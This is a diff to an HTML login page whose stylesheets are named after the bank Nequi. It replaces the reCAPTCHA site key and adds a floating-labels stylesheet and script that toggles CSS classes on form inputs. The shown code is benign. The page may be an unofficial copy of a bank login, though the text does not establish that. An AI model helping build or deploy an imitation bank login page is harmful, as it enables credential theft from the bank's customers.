@@ -18,6 +18,7 @@
   <link rel="stylesheet" type="text/css" href="css/nequi_two.webflow.css">
   <link rel="stylesheet" type="text/css" href="css/nequi_one.webflow.css">
   <link rel="stylesheet" type="text/css" href="css/main.css">
+  <link rel="stylesheet" type="text/css" href="css/floating-labels.css">
   <link rel="shortcut icon" type="image/x-icon" href="images/favicon.ico">
 
     <!-- Librerias JS -->
@@ -75,11 +76,11 @@
                           class="captcha-wp"
                           vc-recaptcha
                           ng-model="loginControl.myRecaptchaResponse"
-                          key="'6LdjCwshAAAAALml0fdmI80RRivlxm74orS_2V4i'"
+                          key="'6Ld2_-crAAAAALY1s-RWrsnfInjJOLaSPQQhsnCY'"
                           lang="es"
                           type="'image'"
                       ></div>
-                      <div class="g-recaptcha" data-sitekey="6LdjCwshAAAAALml0fdmI80RRivlxm74orS_2V4i"></div>
+                      <div class="g-recaptcha" data-sitekey="6Ld2_-crAAAAALY1s-RWrsnfInjJOLaSPQQhsnCY"></div>
                     </div>
 
                     <div class="btn-wrap">
@@ -108,6 +109,77 @@
   <script src="js/libs/angular-no-captcha.js"></script>
   <script src="js/libs/angular-input-masks-standalone.min.js"></script>
   <script src="js/libs/string-mask.js"></script>
+  <!-- Floating Labels Animation -->
+  <script>
+    document.addEventListener('DOMContentLoaded', function() {
+        // Función para manejar la animación de floating labels
+        function initializeFloatingLabels() {
+            const formGroups = document.querySelectorAll('.form-group');
+            
+            formGroups.forEach(function(formGroup) {
+                const input = formGroup.querySelector('input');
+                const label = formGroup.querySelector('label');
+                
+                if (!input || !label) return;
+                
+                // Agregar placeholder transparente si no existe
+                if (!input.hasAttribute('placeholder')) {
+                    input.setAttribute('placeholder', ' ');
+                }
+                
+                // Función para verificar si el input tiene contenido
+                function checkInputState() {
+                    const hasContent = input.value.length > 0;
+                    const isFocused = document.activeElement === input;
+                    
+                    // Remover clases previas
+                    formGroup.classList.remove('has-content', 'is-focused');
+                    
+                    // Agregar clases según el estado
+                    if (hasContent) {
+                        formGroup.classList.add('has-content');
+                    }
+                    if (isFocused) {
+                        formGroup.classList.add('is-focused');
+                    }
+                }
+                
+                // Event listeners para focus y blur
+                input.addEventListener('focus', function() {
+                    formGroup.classList.add('is-focused');
+                    checkInputState();
+                });
+                
+                input.addEventListener('blur', function() {
+                    formGroup.classList.remove('is-focused');
+                    checkInputState();
+                });
+                
+                // Event listener para cambios en el input
+                input.addEventListener('input', function() {
+                    checkInputState();
+                });
+                
+                // Event listener para cambios con teclado
+                input.addEventListener('keyup', function() {
+                    checkInputState();
+                });
+                
+                // Verificar estado inicial
+                checkInputState();
+            });
+        }
+        
+        // Inicializar cuando el DOM esté listo
+        initializeFloatingLabels();
+        
+        // Reinicializar si hay cambios dinámicos en Angular
+        setTimeout(function() {
+            initializeFloatingLabels();
+        }, 1000);
+    });
+  </script>
+  
   <!-- App -->
   <script src="js/scripts.js"></script>
 </html>
